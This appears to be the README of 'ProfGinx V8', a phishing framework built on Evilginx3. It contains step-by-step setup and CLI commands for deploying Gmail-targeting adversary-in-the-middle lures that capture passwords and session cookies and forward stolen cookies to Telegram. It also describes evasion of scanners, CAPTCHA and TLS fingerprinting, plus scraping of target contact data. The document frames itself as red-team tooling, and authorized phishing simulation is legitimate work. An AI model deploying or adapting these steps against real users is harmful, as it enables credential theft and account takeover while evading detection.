# ProfGinx V8

Advanced phishing framework built on Evilginx3 with integrated campaign management, real-time monitoring dashboard, data extraction tools, and comprehensive evasion capabilities. **For authorized security testing and red team engagements only.**

---

## Features

### Core Framework
- **EvilFeed Dashboard** - Real-time monitoring with live world map, WebSocket events, and credential viewer
- **GoPhish Integration** - Email & SMS campaign management with RID tracking across captures
- **Chrome 120 Fingerprinting** - Bypasses Google's anti-bot detection
- **Cloudflare Turnstile** - CAPTCHA verification to block automated scanners
- **Request Checker** - ASN, IP, IP range, and User-Agent blocklists
- **Telegram Alerts** - Real-time notifications with session cookie attachments (multi-channel support)
- **Proxy Support** - Route traffic through HTTP/HTTPS/SOCKS5 proxies
- **Reverse Proxy Support** - Nginx/Caddy for JA3/JA4 fingerprint evasion
- **GeoIP Enrichment** - IP-API integration for location tracking

### Data Extraction Suite
- **Google Maps Scraper** - Scrape business listings with phone/email extraction
- **DomainHunterPro** - Find expired domains with SEO metrics analysis
- **Unified Export Pipeline** - Merge, deduplicate, and validate data from all sources
- **GoPhish CSV Export** - Direct export to GoPhish user groups format

### PhishCreator
- **Phishlet Analyzer** - AI-powered analysis and fixing of phishlet YAML files
- **HAR Comparison** - Compare phishlets against captured HTTP traffic
- **Auto-Fix Suggestions** - Automatic detection and repair of common issues

---

## Quick Start

```bash
# 1. Setup (installs deps, builds binaries)
chmod +x setup.sh start.sh
sudo ./setup.sh full

# 2. Configure DNS (point to your server IP)
# A     your-domain.com      -> server-ip
# A     *.your-domain.com    -> server-ip

# 3. Start all services
sudo ./start.sh all

# 4. Configure in Evilginx CLI
config domain your-domain.com
config ipv4 external your-server-ip
phishlets hostname gmail mail.your-domain.com
phishlets enable gmail
lures create gmail
lures get-url 0
```

---

## Service URLs

| Service | URL | Default Login |
|---------|-----|---------------|
| EvilFeed Dashboard | http://server:1337 | admin / auto-generated |
| GoPhish Admin | https://server:3333 | admin / see gophish.log |
| PhishCreator | http://server:5050 | - |
| GMaps Scraper | http://server:8081 | - |
| DomainHunterPro | http://server:3000 | - |

---

## Commands

### Start/Stop Services

```bash
# Start all services in tmux
sudo ./start.sh all

# Start individual services
sudo ./start.sh run              # Evilginx only
sudo ./start.sh run -feed        # Evilginx + EvilFeed auto-enabled
./start.sh evilfeed              # EvilFeed dashboard only
./start.sh gophish               # GoPhish only
./start.sh phishletweb           # PhishCreator only
./start.sh gmapscraper           # GMaps Scraper only
./start.sh domainhunter          # DomainHunterPro only

# Custom service combinations
sudo ./start.sh evilginx evilfeed gophish -feed
sudo ./start.sh evilginx gophish
./start.sh evilfeed gmapscraper

# Service management
./start.sh status                # Check service status
sudo ./start.sh stop             # Stop all services
./start.sh info                  # Show service information
```

### Reverse Proxy (JA3/JA4 Evasion)

```bash
# Start with nginx reverse proxy
sudo ./start.sh run -reverse nginx yourdomain.com

# Start with caddy reverse proxy  
sudo ./start.sh run -reverse caddy yourdomain.com
```

When using reverse proxy:
- Nginx/Caddy handles SSL on port 443
- Evilginx runs on port 8443 (auto-configured)
- JA3/JA4 fingerprints are masked by the proxy

**tmux navigation:** `tmux attach -t profginx` | Switch windows: Ctrl+B, 0-5 | Detach: Ctrl+B, D

### Evilginx CLI

```bash
# Configuration
config domain <domain>
config ipv4 external <ip>

# Telegram Alerts
config telegram bot_token <token>
config telegram chat_id <id>
config telegram enable

# Turnstile CAPTCHA
config turnstile sitekey <key>
config turnstile secret <secret>
turnstile enable

# Phishlets
phishlets                          # List all
phishlets hostname <name> <host>   # Set hostname
phishlets enable <name>            # Enable
phishlets disable <name>           # Disable

# Lures
lures create <phishlet>            # Create lure
lures get-url <id>                 # Get phishing URL
lures edit <id> redirect_url <url> # Set redirect after capture

# Sessions
sessions                           # List captured sessions
sessions <id>                      # View session details

# Integrations
evilfeed enable                    # Enable dashboard
blocklist enable                   # Enable request blocking
turnstile enable                   # Enable Cloudflare CAPTCHA
```

---

## EvilFeed Dashboard

Real-time phishing monitoring dashboard accessible at `http://server:1337`.

### Features

- **Live Map** - World map with victim locations and time filtering
- **Event Feed** - Real-time WebSocket events with filtering
- **Credentials Page** - Captured usernames, passwords, and session tokens
- **Token Viewer** - Parse and export session cookies in multiple formats
- **Campaign Tracking** - View GoPhish campaigns and correlate RIDs
- **Settings** - Configure Telegram, Turnstile, proxy, anonymity, cloudflare, blocklist, and whitelist
- **Two-Way Sync** - Push/pull configuration between EvilFeed and Evilginx in real-time
- **Toast Notifications** - Modern notification system replacing browser alerts

### Internal API Communication

EvilFeed communicates with Evilginx via an internal HTTP API on port 8888:
- **No TLS required** - Plain HTTP for localhost communication
- **Auto-detection** - EvilFeed automatically finds the internal API
- **Secure** - Only binds to 127.0.0.1 (not accessible externally)

Available endpoints (localhost only):
- `GET/POST /_telegram/config` - Telegram settings
- `GET/POST /_turnstile/config` - Turnstile settings
- `GET/POST /_proxy/config` - Proxy settings
- `GET/POST /_anonymity/config` - Anonymity engine settings
- `GET/POST /_cloudflare/config` - Cloudflare DNS/wildcard cert settings
- `GET/POST /_blocklist/config` - Blocklist/request checker settings
- `GET /_sessions` - All captured sessions
- `GET /_health` - Health check

---

## GoPhish Integration

Integrated campaign management for email and SMS phishing.

### RID Tracking

When victims click campaign links, the RID (Recipient ID) is captured and displayed in:
- EvilFeed event cards
- Credentials page
- Session details
- Telegram notifications

---

## GMaps Scraper

Google Maps business data scraper with web dashboard at `http://server:8081`.

### Features

- **Job Management** - Create, monitor, download scraping jobs
- **Data Extraction** - Extract phones and emails from results
- **Phone Formatting** - Multiple US phone formats
- **Location Lookup** - Auto-geocoding from city/state/zip
- **REST API** - Full API with documentation at `/api/docs`

---

## DomainHunterPro

Expired domain finder with SEO metrics at `http://server:3000`.

### Features

- **Domain Discovery** - Find valuable expired domains
- **Availability Check** - Real-time domain availability
- **SEO Metrics** - Domain authority, backlinks, age analysis
- **Export** - Download domain lists for campaigns

---

## PhishCreator

AI-powered phishlet analyzer at `http://server:5050`.

### Features

- **Drag-and-drop upload** - Upload phishlet YAML and HAR files
- **Auto-analysis** - Detect missing auth tokens, incorrect selectors
- **One-click fixes** - Download corrected phishlet files

---

## Request Checker

Block security scanners and bots:

| File | Purpose |
|------|---------|
| `blocklists/asn_list.txt` | Block by ASN |
| `blocklists/ip_list.txt` | Block specific IPs |
| `blocklists/ip_range_list.txt` | Block IP ranges (CIDR) |
| `blocklists/useragent_list.txt` | Block User-Agent patterns |

Enable with: `blocklist enable` in Evilginx CLI.

---

## Proxy Configuration

Route traffic through proxies to mask server IP:

1. Open EvilFeed Dashboard > Settings > Proxy
2. Select proxy type: HTTP, HTTPS, SOCKS5, or SOCKS5H
3. Enter address, port, and optional credentials
4. Click "Apply Changes" (no restart required)

---

## Ports

| Port | Service | Notes |
|------|---------|-------|
| 80 | Evilginx HTTP | Requires root |
| 443 | Evilginx HTTPS | Requires root (or reverse proxy) |
| 1337 | EvilFeed Dashboard | |
| 3000 | DomainHunterPro | |
| 3333 | GoPhish Admin | HTTPS |
| 5050 | PhishCreator | |
| 8081 | GMaps Scraper | |
| 8443 | Evilginx (reverse proxy mode) | Behind nginx/caddy |
| 8888 | Internal API | Localhost only, HTTP (EvilFeed ↔ Evilginx) |

---

## Setup

```bash
sudo ./setup.sh full    # Complete setup
```

Setup performs:
- Install system dependencies
- Install Chrome (for GoogleBypasser)
- Build Go binaries (Evilginx, EvilFeed, GMaps Scraper)
- Build GoPhish
- Setup PhishCreator (Python venv)
- Setup DomainHunterPro (Node.js)

---

## Troubleshooting

### Port Conflicts

```bash
sudo fuser -k 80/tcp 443/tcp
sudo systemctl stop apache2 nginx
```

### Certificate Issues

```bash
# Use developer mode for self-signed certs
sudo ./evilginx2 -developer
```

### Service Status

```bash
./start.sh status
tmux attach -t profginx
```

---

## Legal Notice

**For authorized security testing only.**

This tool is designed for:
- Authorized penetration testing engagements
- Red team exercises with written permission
- Security awareness training programs

Users must obtain written authorization and comply with all applicable laws.

---

Version 8.0 | Copyright 2024-2025 | Maintained by **Billion_laughs**
